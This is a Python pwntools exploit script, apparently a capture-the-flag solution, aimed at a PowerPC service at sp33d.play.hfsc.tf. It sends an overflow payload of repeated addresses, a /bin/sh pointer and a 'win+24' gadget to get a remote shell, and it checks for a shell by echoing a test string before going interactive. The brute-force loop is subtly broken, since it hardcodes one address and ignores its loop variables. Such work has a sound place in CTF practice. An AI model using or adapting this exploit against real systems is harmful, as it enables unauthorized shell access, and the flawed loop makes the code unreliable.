from pwn import *
import sys

# Configuration
HOST = 'sp33d.play.hfsc.tf'
PORT = 20020
BINSH_ADDR = 0x10077a8c
WIN_PLUS_24 = 0x10000610
TIMEOUT = 0.5

context.log_level = 'info'
context.arch = 'powerpc'

# Function to try a specific address
def try_exploit(addr):
    try:
        p = remote(HOST, PORT, timeout=TIMEOUT)
        p.recvuntil(b"pwn: ", timeout=TIMEOUT)
        
        # Craft payload
        payload = p32(addr) * 6
        payload += p32(BINSH_ADDR)
        payload += p32(WIN_PLUS_24)
        payload += p32(addr) * 2
        
        p.sendline(payload)
        
        # Test if we have a shell by trying to run a command
        p.sendline(b"echo SHELLTEST")
        response = p.recvline(timeout=0.5)
        
        # If we see our test string, we have a shell
        if b"SHELLTEST" in response:
            log.success(f"SUCCESS with address 0x{addr:08x}!")
            
            # Get interactive shell
            p = remote(HOST, PORT, timeout=TIMEOUT)
            p.recvuntil(b"pwn: ", timeout=TIMEOUT)
            p.sendline(payload)
            p.interactive()
            return True
        
        # No shell found
        p.close()
        return False
    
    except EOFError:
        # Handle EOF separately
        try:
            p.close()
        except:
            pass
        return False
    
    except Exception as e:
        # Handle other exceptions
        try:
            p.close()
        except:
            pass
        return False

# Check command line arguments for start position
start_second_last = 0
start_last = 0x08  # Start with the first 8-byte aligned value

if len(sys.argv) > 2:
    start_second_last = int(sys.argv[1], 16)
    start_last = int(sys.argv[2], 16)
    # Ensure last byte is 8-byte aligned
    if start_last % 8 != 0:
        start_last = (start_last // 8) * 8 + 0x08
    log.info(f"Starting from 0x407f{start_second_last:02x}{start_last:02x}")

# Start at the specified position and test all combinations
log.info(f"Testing all addresses from 0x407f{start_second_last:02x}{start_last:02x} to 0x407fffF8")

# Loop through all possible second last bytes
for second_last_byte in range(start_second_last, 256):
    # Loop through 8-byte aligned last bytes (0x08, 0x18, 0x28...)
    for last_byte in range(start_last if second_last_byte == start_second_last else 0x08, 0x100, 0x10):
        addr = 0x407ffd28
        
        # Print current address being tested
        log.info(f"Testing address: 0x{addr:08x}")
        
        if try_exploit(addr):
            sys.exit(0)
